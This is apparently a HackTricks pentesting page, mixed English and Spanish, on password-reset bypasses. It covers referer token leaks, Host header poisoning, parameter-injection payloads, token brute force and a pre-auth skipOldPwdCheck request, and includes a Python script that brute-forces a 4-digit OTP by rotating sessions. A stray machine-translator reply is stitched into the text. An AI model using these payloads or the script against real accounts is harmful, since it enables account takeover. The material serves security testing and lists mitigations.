# Reset/Forgotten Password Bypass

{{#include ../banners/hacktricks-training.md}}

## **Password Reset Token Leak Via Referrer**

- The HTTP referer header may leak the password reset token if it's included in the URL. Esto puede ocurrir cuando un usuario hace clic en un enlace de un sitio web de terceros después de solicitar un restablecimiento de contraseña.
- **Impacto**: Posible takeover de la cuenta mediante ataques Cross-Site Request Forgery (CSRF).
- **Explotación**: Para comprobar si un password reset token se está leaking en el referer header, **solicita un password reset** a tu dirección de correo y **haz clic en el reset link** proporcionado. **No cambies tu password** inmediatamente. En su lugar, **navega a un sitio web de terceros** (como Facebook o Twitter) mientras **interceptas las peticiones usando Burp Suite**. Inspecciona las peticiones para ver si el **referer header contiene el password reset token**, ya que esto podría exponer información sensible a terceros.
- **Referencias**:
- [HackerOne Report 342693](https://hackerone.com/reports/342693)
- [HackerOne Report 272379](https://hackerone.com/reports/272379)
- [Password Reset Token Leak Article](https://medium.com/@rubiojhayz1234/toyotas-password-reset-token-and-email-address-leak-via-referer-header-b0ede6507c6a)

## **Password Reset Poisoning**

- Los atacantes pueden manipular el Host header durante las peticiones de password reset para apuntar el reset link a un sitio malicioso.
- **Impacto**: Conduce a una posible takeover de cuentas al leaking reset tokens a los atacantes.
- **Pasos de mitigación**:
- Valida el Host header contra una whitelist de dominios permitidos.
- Usa métodos seguros del lado servidor para generar absolute URLs.
- **Patch**: Usa `$_SERVER['SERVER_NAME']` para construir password reset URLs en lugar de `$_SERVER['HTTP_HOST']`.
- **Referencias**:
- [Acunetix Article on Password Reset Poisoning](https://www.acunetix.com/blog/articles/password-reset-poisoning/)

## **Password Reset By Manipulating Email Parameter**

Los atacantes pueden manipular la petición de password reset añadiendo parámetros de email adicionales para desviar el reset link.

- Añadir el email del atacante como segundo parámetro usando &
```php
POST /resetPassword
[...]
email=victim@email.com&email=attacker@email.com
```
- Agregar attacker email como segundo parámetro usando %20
```php
POST /resetPassword
[...]
email=victim@email.com%20email=attacker@email.com
```
- Añadir el correo electrónico del atacante como segundo parámetro usando |
```php
POST /resetPassword
[...]
email=victim@email.com|email=attacker@email.com
```
- Añade el correo electrónico del atacante como segundo parámetro usando cc
```php
POST /resetPassword
[...]
email="victim@mail.tld%0a%0dcc:attacker@mail.tld"
```
- Añadir attacker email como segundo parámetro usando bcc
```php
POST /resetPassword
[...]
email="victim@mail.tld%0a%0dbcc:attacker@mail.tld"
```
- Añadir attacker email como segundo parámetro usando ,
```php
POST /resetPassword
[...]
email="victim@mail.tld",email="attacker@mail.tld"
```
Necesito el contenido del archivo o el fragmento JSON que quieres modificar para poder traducirlo y añadir el email del atacante como segundo parámetro en el array JSON. ¿Puedes pegar aquí el texto o el bloque de código?
```php
POST /resetPassword
[...]
{"email":["victim@mail.tld","atracker@mail.tld"]}
```
- **Pasos de mitigación**:
- Analizar y validar correctamente los parámetros de correo electrónico en el servidor.
- Usar prepared statements o parameterized queries para prevenir ataques de inyección.
- **Referencias**:
- [https://medium.com/@0xankush/readme-com-account-takeover-bugbounty-fulldisclosure-a36ddbe915be](https://medium.com/@0xankush/readme-com-account-takeover-bugbounty-fulldisclosure-a36ddbe915be)
- [https://ninadmathpati.com/2019/08/17/how-i-was-able-to-earn-1000-with-just-10-minutes-of-bug-bounty/](https://ninadmathpati.com/2019/08/17/how-i-was-able-to-earn-1000-with-just-10-minutes-of-bug-bounty/)
- [https://twitter.com/HusseiN98D/status/1254888748216655872](https://twitter.com/HusseiN98D/status/1254888748216655872)

## **Cambio de correo electrónico y contraseña de cualquier usuario mediante parámetros de la API**

- Los atacantes pueden modificar los parámetros de correo electrónico y contraseña en las solicitudes de la API para cambiar las credenciales de la cuenta.
```php
POST /api/changepass
[...]
("form": {"email":"victim@email.tld","password":"12345678"})
```
- **Pasos de mitigación**:
- Asegurar una validación estricta de parámetros y comprobaciones de autenticación.
- Implementar logging y monitoreo robustos para detectar y responder a actividades sospechosas.
- **Referencia**:
- [Full Account Takeover via API Parameter Manipulation](https://medium.com/@adeshkolte/full-account-takeover-changing-email-and-password-of-any-user-through-api-parameters-3d527ab27240)

## **No Rate Limiting: Email Bombing**

- La falta de rate limiting en las solicitudes de password reset puede llevar a email bombing, abrumando al usuario con correos de reset.
- **Pasos de mitigación**:
- Implementar rate limiting basado en dirección IP o en la cuenta de usuario.
- Usar desafíos CAPTCHA para prevenir abuso automatizado.
- **Referencias**:
- [HackerOne Report 280534](https://hackerone.com/reports/280534)

## **Find out How Password Reset Token is Generated**

- Entender el patrón o método detrás de la generación del Password Reset Token puede permitir predecirlo o hacer brute-force. Algunas opciones:
- Based Timestamp
- Based on the UserID
- Based on email of User
- Based on Firstname and Lastname
- Based on Date of Birth
- Based on Cryptography
- **Pasos de mitigación**:
- Usar métodos criptográficos fuertes para la generación de tokens.
- Asegurar suficiente aleatoriedad y longitud para prevenir predictibilidad.
- **Herramientas**: Usar Burp Sequencer para analizar la aleatoriedad de los tokens.

## **Guessable UUID**

- Si los UUIDs (version 1) son adivinables o previsibles, los atacantes pueden brute-forcearlos para generar reset tokens válidos. Revisa:


{{#ref}}
uuid-insecurities.md
{{#endref}}

- **Pasos de mitigación**:
- Usar GUID version 4 para mayor aleatoriedad o implementar medidas adicionales de seguridad para otras versiones.
- **Herramientas**: Usar [guidtool](https://github.com/intruder-io/guidtool) para analizar y generar GUIDs.

## **Response Manipulation: Replace Bad Response With Good One**

- Manipular respuestas HTTP para eludir mensajes de error o restricciones.
- **Pasos de mitigación**:
- Implementar comprobaciones server-side para asegurar la integridad de las respuestas.
- Usar canales de comunicación seguros como HTTPS para prevenir man-in-the-middle.
- **Referencia**:
- [Critical Bug in Live Bug Bounty Event](https://medium.com/@innocenthacker/how-i-found-the-most-critical-bug-in-live-bug-bounty-event-7a88b3aa97b3)

## **Using Expired Token**

- Probar si tokens expirados aún pueden usarse para el password reset.
- **Pasos de mitigación**:
- Implementar políticas estrictas de expiración de tokens y validar la expiración server-side.

## **Brute Force Password Reset Token**

- Intentar brute-force del reset token usando herramientas como Burpsuite y IP-Rotator para evadir rate limits basados en IP.
- **Pasos de mitigación**:
- Implementar rate-limiting robusto y mecanismos de bloqueo de cuenta.
- Monitorizar actividades sospechosas indicativas de ataques de fuerza bruta.

## **Try Using Your Token**

- Probar si el reset token de un atacante puede usarse junto con el email de la víctima.
- **Pasos de mitigación**:
- Asegurar que los tokens estén vinculados a la sesión del usuario u otros atributos específicos del usuario.

## **Session Invalidation in Logout/Password Reset**

- Asegurar que las sesiones se invaliden cuando un usuario hace logout o resetea su password.
- **Pasos de mitigación**:
- Implementar una gestión de sesiones correcta, asegurando que todas las sesiones se invaliden al hacer logout o al resetear la contraseña.

## **Session Invalidation in Logout/Password Reset**

- Los reset tokens deben tener un tiempo de expiración después del cual se vuelven inválidos.
- **Pasos de mitigación**:
- Establecer un tiempo de expiración razonable para los reset tokens y aplicarlo estrictamente server-side.

## **OTP rate limit bypass by changing your session**

- Si el sitio usa la sesión de usuario para rastrear intentos fallidos de OTP y el OTP es débil (<= 4 dígitos) entonces podemos efectivamente brute-forcear el OTP.
- **exploitation**:
- simplemente solicitar un nuevo session token después de ser bloqueado por el servidor.
- **Example** code that exploits this bug by randomly guessing the OTP (when you change the session the OTP will change as well, and so we will not be able to sequentially bruteforce it!):

``` python
# Authentication bypass by password reset
# by coderMohammed
import requests
import random
from time import sleep

headers = {
"User-Agent": "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1",
"Cookie": "PHPSESSID=mrerfjsol4t2ags5ihvvb632ea"
}
url = "http://10.10.12.231:1337/reset_password.php"
logout = "http://10.10.12.231:1337/logout.php"
root = "http://10.10.12.231:1337/"

parms = dict()
ter = 0
phpsessid = ""

print("[+] Starting attack!")
sleep(3)
print("[+] This might take around 5 minutes to finish!")

try:
while True:
parms["recovery_code"] = f"{random.randint(0, 9999):04}" # random number from 0 - 9999 with 4 d
parms["s"] = 164 # not important it only efects the frontend
res = requests.post(url, data=parms, allow_redirects=True, verify=False, headers=headers)

if ter == 8: # follow number of trails
out = requests.get(logout,headers=headers) # log u out
mainp = requests.get(root) # gets another phpssid (token)

cookies = out.cookies # extract the sessionid
phpsessid = cookies.get('PHPSESSID')
headers["cookies"]=f"PHPSESSID={phpsessid}" #update the headers with new session

reset = requests.post(url, data={"email":"tester@hammer.thm"}, allow_redirects=True, verify=False, headers=headers) # sends the email to change the password for
ter = 0 # reset ter so we get a new session after 8 trails
else:
ter += 1
if(len(res.text) == 2292): # this is the length of the page when u get the recovery code correctly (got by testing)
print(len(res.text)) # for debug info
print(phpsessid)

reset_data = { # here we will change the password to somthing new
"new_password": "D37djkamd!",
"confirm_password": "D37djkamd!"
}
reset2 = requests.post(url, data=reset_data, allow_redirects=True, verify=False, headers=headers)

print("[+] Password has been changed to:D37djkamd!")
break
except Exception as e:
print("[+] Attck stopped")
```

## Arbitrary password reset via skipOldPwdCheck (pre-auth)

Some implementations expose a password change action that calls the password-change routine with skipOldPwdCheck=true and does not verify any reset token or ownership. If the endpoint accepts an action parameter like change_password and a username/new password in the request body, an attacker can reset arbitrary accounts pre-auth.

Vulnerable pattern (PHP):
```php
// hub/rpwd.php
RequestHandler::validateCSRFToken();
$RP = new RecoverPwd();
$RP->process($_REQUEST, $_POST);

// modules/Users/RecoverPwd.php
if ($request['action'] == 'change_password') {
$body = $this->displayChangePwd($smarty, $post['user_name'], $post['confirm_new_password']);
}

public function displayChangePwd($smarty, $username, $newpwd) {
$current_user = CRMEntity::getInstance('Users');
$current_user->id = $current_user->retrieve_user_id($username);
// ... criteria checks omitted ...
$current_user->change_password('oldpwd', $_POST['confirm_new_password'], true, true); // skipOldPwdCheck=true
emptyUserAuthtokenKey($this->user_auth_token_type, $current_user->id);
}
```
Solicitud de explotación (concepto):
```http
POST /hub/rpwd.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

action=change_password&user_name=admin&confirm_new_password=NewP@ssw0rd!
```
Mitigations:
- Siempre exige un reset token válido y limitado en el tiempo, vinculado a la account y al session antes de cambiar la contraseña.
- Nunca expongas las rutas skipOldPwdCheck a usuarios no autenticados; exige autenticación para cambios de contraseña normales y verifica la contraseña anterior.
- Invalida todas las sessions activas y los reset tokens después de un cambio de contraseña.

## Referencias

- [https://anugrahsr.github.io/posts/10-Password-reset-flaws/#10-try-using-your-token](https://anugrahsr.github.io/posts/10-Password-reset-flaws/#10-try-using-your-token)
- [https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)

{{#include ../banners/hacktricks-training.md}}
